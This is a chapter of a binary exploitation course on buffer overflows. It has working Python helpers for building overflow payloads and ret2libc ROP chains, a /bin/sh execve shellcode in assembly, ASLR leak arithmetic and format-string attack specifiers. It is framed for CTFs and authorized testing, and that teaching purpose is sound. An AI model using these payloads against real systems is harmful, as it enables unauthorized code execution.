# Buffer Overflow

**Previous**: [09. Binary Fundamentals](./09_Binary_Fundamentals.md) | **Next**: [11. Reverse Engineering](./11_Reverse_Engineering.md)

---

Buffer overflow vulnerabilities have been a cornerstone of exploitation since the Morris Worm of 1988. Despite decades of mitigation technologies (ASLR, DEP/NX, stack canaries), buffer overflows remain relevant in embedded systems, legacy software, and as the foundation for understanding modern exploitation techniques like Return-Oriented Programming (ROP).

> **IMPORTANT**: Binary exploitation skills should only be applied in CTF competitions, authorized security assessments, and personal lab environments.

**Difficulty**: ⭐⭐⭐⭐

## Learning Objectives

1. Understand how buffer overflows corrupt stack memory
2. Craft payloads to overwrite the return address
3. Write and inject basic shellcode
4. Bypass NX/DEP using Return-Oriented Programming
5. Understand ASLR and techniques to defeat it
6. Exploit format string vulnerabilities
7. Build complete exploit chains combining multiple techniques
8. Use pwntools for exploit development

---

## Table of Contents

1. [Stack Buffer Overflow Basics](#1-stack-buffer-overflow-basics)
2. [Controlling the Instruction Pointer](#2-controlling-the-instruction-pointer)
3. [Shellcode Writing](#3-shellcode-writing)
4. [NX/DEP Protection and Bypass](#4-nxdep-protection-and-bypass)
5. [Return-Oriented Programming (ROP)](#5-return-oriented-programming-rop)
6. [ASLR and Information Leaks](#6-aslr-and-information-leaks)
7. [Stack Canaries](#7-stack-canaries)
8. [Format String Vulnerabilities](#8-format-string-vulnerabilities)
9. [Heap Exploitation Basics](#9-heap-exploitation-basics)
10. [Modern Mitigation Technologies](#10-modern-mitigation-technologies)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. Stack Buffer Overflow Basics

### 1.1 The Vulnerability

A buffer overflow occurs when a program writes data beyond the allocated buffer boundary, corrupting adjacent memory.

```c
// VULNERABLE CODE
void vulnerable_function(char *input) {
    char buffer[64];       // 64-byte buffer on the stack
    strcpy(buffer, input); // No bounds checking!
    // If input > 64 bytes, overflows into saved RBP and return address
}
```

### 1.2 Stack Layout During Overflow

```
Before overflow:              After overflow:
┌─────────────────┐          ┌─────────────────┐
│ Return Address   │          │ AAAA (overwritten)│ ← Controlled!
├─────────────────┤          ├─────────────────┤
│ Saved RBP        │          │ AAAA (overwritten)│
├─────────────────┤          ├─────────────────┤
│ buffer[56..63]   │          │ AAAAAAAA         │
│ ...              │          │ ...              │
│ buffer[0..7]     │          │ AAAAAAAA         │
└─────────────────┘          └─────────────────┘
```

```python
"""
Buffer overflow exploit development framework.

Provides utilities for crafting buffer overflow exploits
in CTF competitions and authorized security testing.
"""

import struct
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class ExploitConfig:
    """Configuration for a buffer overflow exploit."""
    buffer_size: int
    offset_to_rip: int  # Bytes from buffer start to return address
    target_address: int  # Address to redirect execution
    arch: str = "x64"  # x86 or x64
    endianness: str = "little"
    bad_chars: bytes = b"\x00"  # Null bytes usually bad

    def pack_address(self, addr: int) -> bytes:
        """Pack an address in the correct format."""
        if self.arch == "x64":
            return struct.pack("<Q", addr)
        return struct.pack("<I", addr)


def create_pattern(length: int) -> bytes:
    """
    Create a cyclic pattern for finding offsets.

    Similar to msf-pattern_create / cyclic from pwntools.
    Each 4-byte subsequence is unique, allowing you to
    find the exact offset to any overwritten value.
    """
    pattern = b""
    for upper in range(ord('A'), ord('Z') + 1):
        for lower in range(ord('a'), ord('z') + 1):
            for digit in range(ord('0'), ord('9') + 1):
                pattern += bytes([upper, lower, digit])
                if len(pattern) >= length:
                    return pattern[:length]
    return pattern[:length]


def find_pattern_offset(pattern: bytes, value: bytes) -> int:
    """Find the offset of a value within a cyclic pattern."""
    # Handle little-endian 4-byte values
    idx = pattern.find(value)
    if idx >= 0:
        return idx
    # Try reversed (big-endian interpretation)
    idx = pattern.find(value[::-1])
    return idx


def build_exploit(config: ExploitConfig) -> bytes:
    """
    Build a basic buffer overflow payload.

    Structure:
    [padding][return_address]

    The padding fills the buffer up to the return address,
    then the return address redirects execution to our target.
    """
    padding = b"A" * config.offset_to_rip
    ret_addr = config.pack_address(config.target_address)

    # Verify no bad characters
    for char in config.bad_chars:
        if bytes([char]) in ret_addr:
            raise ValueError(
                f"Bad character 0x{char:02x} found in return address"
            )

    return padding + ret_addr


def build_rop_chain(
    config: ExploitConfig,
    gadgets: list[int],
) -> bytes:
    """
    Build a ROP chain payload.

    Structure:
    [padding][gadget1][gadget2]...[gadgetN]
    """
    padding = b"A" * config.offset_to_rip
    chain = b""
    for gadget in gadgets:
        chain += config.pack_address(gadget)
    return padding + chain


if __name__ == "__main__":
    print("Buffer Overflow Exploit Framework")
    print("=" * 50)

    # Generate cyclic pattern
    pattern = create_pattern(200)
    print(f"Cyclic pattern (200 bytes): {pattern[:50]}...")

    # Example: find offset
    # After crash, EIP/RIP contains "6Aa7"
    crash_value = b"6Aa7"
    offset = find_pattern_offset(pattern, crash_value)
    print(f"Offset of '{crash_value.decode()}' in pattern: {offset}")

    # Build exploit
    config = ExploitConfig(
        buffer_size=64,
        offset_to_rip=72,  # 64 buffer + 8 saved RBP
        target_address=0x00401234,
        arch="x64",
    )
    payload = build_exploit(config)
    print(f"\nExploit payload ({len(payload)} bytes):")
    print(f"  Padding: {config.offset_to_rip} bytes")
    print(f"  Target: 0x{config.target_address:016x}")
```

---

## 2. Controlling the Instruction Pointer

### 2.1 Finding the Offset

```bash
# Method 1: Cyclic pattern (pwntools)
python3 -c "from pwn import *; print(cyclic(200))"
# Run program with pattern, note crash value
python3 -c "from pwn import *; print(cyclic_find(0x61616167))"  # Returns offset

# Method 2: Metasploit pattern
msf-pattern_create -l 200
msf-pattern_offset -q <crash_value>
```

### 2.2 Redirecting Execution

Once you control RIP/EIP, redirect to:
- **ret2win**: Jump to an existing function in the binary
- **ret2shellcode**: Jump to injected shellcode (requires executable stack)
- **ret2libc**: Jump to libc functions (system, execve)
- **ROP**: Chain gadgets for arbitrary computation

---

## 3. Shellcode Writing

### 3.1 Basic x86-64 Linux Shellcode

```nasm
; execve("/bin/sh", NULL, NULL) — 27 bytes
; System call number for execve: 59 (0x3b)

section .text
global _start
_start:
    xor rsi, rsi        ; rsi = 0 (argv = NULL)
    xor rdx, rdx        ; rdx = 0 (envp = NULL)
    push rsi             ; null terminator
    mov rdi, 0x68732f6e69622f  ; "/bin/sh" in little-endian
    push rdi
    mov rdi, rsp         ; rdi = pointer to "/bin/sh"
    mov al, 59           ; syscall number for execve
    syscall
```

### 3.2 Shellcode Constraints

- **No null bytes**: `\x00` terminates C strings (use XOR to zero registers)
- **No newlines**: `\x0a` terminates line-based input
- **Size limits**: Shellcode must fit in the available buffer space
- **Character restrictions**: Some inputs filter non-printable characters

---

## 4. NX/DEP Protection and Bypass

**NX (No-eXecute) / DEP (Data Execution Prevention)** marks memory pages as non-executable, preventing direct shellcode injection on the stack or heap.

### 4.1 How NX Works

```
Without NX:                    With NX:
Stack: rwx (read/write/exec)   Stack: rw- (read/write only)
Heap:  rwx                     Heap:  rw-
Code:  r-x                     Code:  r-x
```

### 4.2 Bypassing NX

Since we can't execute code on the stack, we use code that already exists:

1. **ret2libc**: Call `system("/bin/sh")` from libc
2. **ROP**: Chain existing code snippets (gadgets)
3. **mprotect**: Make a memory region executable, then jump to shellcode

---

## 5. Return-Oriented Programming (ROP)

ROP chains "gadgets" — small instruction sequences ending in `ret` — to perform arbitrary computation.

### 5.1 ROP Gadgets

```nasm
; Example gadgets found in a binary:
pop rdi; ret          ; Load a value into RDI
pop rsi; ret          ; Load a value into RSI
pop rdx; ret          ; Load a value into RDX
mov rdi, rax; ret     ; Move RAX to RDI
syscall; ret          ; Execute system call
```

### 5.2 Building a ROP Chain

```python
"""
ROP chain builder using pwntools-compatible syntax.

Demonstrates how to chain gadgets for calling system("/bin/sh")
with NX enabled.
"""

from dataclasses import dataclass
import struct


@dataclass
class ROPGadget:
    """A ROP gadget with its address and description."""
    address: int
    instructions: str
    description: str = ""


def build_ret2libc_chain(
    pop_rdi_ret: int,
    bin_sh_addr: int,
    system_addr: int,
    ret_gadget: int = 0,
) -> bytes:
    """
    Build a ret2libc ROP chain to call system("/bin/sh").

    Stack layout after overflow:
    [pop rdi; ret]  ← first gadget
    ["/bin/sh" addr] ← popped into RDI
    [system() addr]  ← called with RDI = "/bin/sh"
    """
    chain = b""

    # Stack alignment (needed on Ubuntu/x64 for movaps in system())
    if ret_gadget:
        chain += struct.pack("<Q", ret_gadget)

    # pop rdi; ret — load address of "/bin/sh" into RDI
    chain += struct.pack("<Q", pop_rdi_ret)
    chain += struct.pack("<Q", bin_sh_addr)

    # Call system()
    chain += struct.pack("<Q", system_addr)

    return chain


def find_gadgets_example():
    """Demonstrate how to find gadgets using ROPgadget."""
    print("Finding ROP gadgets:")
    print("  $ ROPgadget --binary ./vuln | grep 'pop rdi'")
    print("  $ ROPgadget --binary ./vuln | grep 'pop rsi'")
    print("  $ ROPgadget --binary ./vuln | grep 'ret$'")
    print("  $ ropper -f ./vuln --search 'pop rdi'")
    print()
    print("Common tool: ROPgadget, ropper, or pwntools' ROP()")


if __name__ == "__main__":
    print("ROP Chain Builder")
    print("=" * 50)
    find_gadgets_example()

    # Example chain (addresses would come from binary analysis)
    chain = build_ret2libc_chain(
        pop_rdi_ret=0x401234,
        bin_sh_addr=0x7ffff7d8d698,
        system_addr=0x7ffff7c50d60,
        ret_gadget=0x40101a,
    )
    print(f"\nROP chain ({len(chain)} bytes):")
    for i in range(0, len(chain), 8):
        addr = struct.unpack("<Q", chain[i:i+8])[0]
        print(f"  0x{addr:016x}")
```

---

## 6. ASLR and Information Leaks

**ASLR (Address Space Layout Randomization)** randomizes memory addresses at each execution, making it impossible to predict addresses for ROP chains or shellcode.

### 6.1 Defeating ASLR

- **Information leak**: Leak a runtime address to calculate base addresses
- **Partial overwrite**: Overwrite only the lower bytes (which don't change)
- **Brute force**: On 32-bit systems, only 8-16 bits of randomization
- **Format string**: Use %p to leak stack/GOT addresses

### 6.2 Leaking Addresses

```python
"""
Demonstrates how to use information leaks to defeat ASLR.
"""

import struct


def calculate_libc_base(leaked_addr: int, known_offset: int) -> int:
    """
    Calculate libc base from a leaked address.

    If we leak the address of puts() from the GOT, and we know
    the offset of puts() within libc, we can calculate the base.
    """
    return leaked_addr - known_offset


def calculate_target(base: int, target_offset: int) -> int:
    """Calculate target function address from base + offset."""
    return base + target_offset


if __name__ == "__main__":
    # Example: leaked puts() address
    leaked_puts = 0x7f1234567890
    puts_offset = 0x80e50  # Offset of puts in libc

    libc_base = calculate_libc_base(leaked_puts, puts_offset)
    system_offset = 0x50d60  # Offset of system in libc
    system_addr = calculate_target(libc_base, system_offset)

    print(f"Leaked puts:    0x{leaked_puts:016x}")
    print(f"libc base:      0x{libc_base:016x}")
    print(f"system() addr:  0x{system_addr:016x}")
```

---

## 7. Stack Canaries

Stack canaries place a random value between local variables and the return address. If the canary is overwritten, the program aborts.

### 7.1 Canary Bypass Techniques

- **Leak the canary**: Through format string or information disclosure
- **Brute force**: In forking servers, canary doesn't change per-fork
- **Overwrite without touching**: Target specific data without crossing the canary

---

## 8. Format String Vulnerabilities

```c
// VULNERABLE — user controls format string
printf(user_input);           // Attacker can use %x, %p, %n

// SAFE — format string is hardcoded
printf("%s", user_input);     // User input treated as data
```

### 8.1 Format String Exploitation

```
%x     — Read stack values (hex)
%p     — Read stack pointers
%s     — Read string at stack address
%n     — Write number of bytes printed to address on stack
%99c   — Print 99 characters (control %n writes)
```

---

## 9. Heap Exploitation Basics

### 9.1 Common Heap Vulnerabilities

- **Use-After-Free (UAF)**: Access memory after it's been freed
- **Double Free**: Free the same chunk twice, corrupting allocator metadata
- **Heap Overflow**: Overflow into adjacent heap chunks
- **Uninitialized Use**: Use heap memory without initialization

---

## 10. Modern Mitigation Technologies

| Mitigation | Purpose | Bypass Difficulty |
|-----------|---------|-------------------|
| NX/DEP | Prevent code execution on stack/heap | Medium (ROP) |
| ASLR | Randomize memory layout | Medium (info leak) |
| Stack Canaries | Detect stack overwrites | Medium (leak/brute) |
| PIE | Randomize code segment | Medium (info leak) |
| RELRO | Protect GOT from overwriting | Hard (Full RELRO) |
| CFI | Control Flow Integrity | Hard |
| Shadow Stack | Hardware-backed return address protection | Very Hard |

---

## 11. Exercises

1. **Pattern Offset**: Use cyclic patterns to find the exact offset to RIP on a vulnerable binary.
2. **ret2win**: Exploit a binary with a `win()` function by overwriting the return address.
3. **ret2libc**: Bypass NX by building a ret2libc chain calling `system("/bin/sh")`.
4. **ROP Chain**: Build a full ROP chain for a binary with NX and no interesting functions.
5. **ASLR Bypass**: Exploit a binary with ASLR by first leaking a libc address.
6. **Format String**: Use a format string vulnerability to read the stack canary, then exploit a buffer overflow.

---

## 12. Summary

Buffer overflow exploitation is foundational to offensive security:

- **Stack overflows** corrupt return addresses to redirect execution
- **Shellcode** provides direct code execution when the stack is executable
- **NX/DEP** prevents stack execution; bypassed with ROP and ret2libc
- **ROP chains** gadgets from existing code for Turing-complete exploitation
- **ASLR** randomizes addresses; defeated through information leaks
- **Stack canaries** detect overwrites; defeated through leaks or brute force
- **Format strings** enable both reading and writing arbitrary memory

---

## 13. References

- Smashing the Stack for Fun and Profit (Aleph One): https://phrack.org/issues/49/14.html
- ROP Emporium: https://ropemporium.com/
- pwntools: https://docs.pwntools.com/
- Nightmare (Binary Exploitation Course): https://guyinatuxedo.github.io/
- LiveOverflow Binary Exploitation: https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
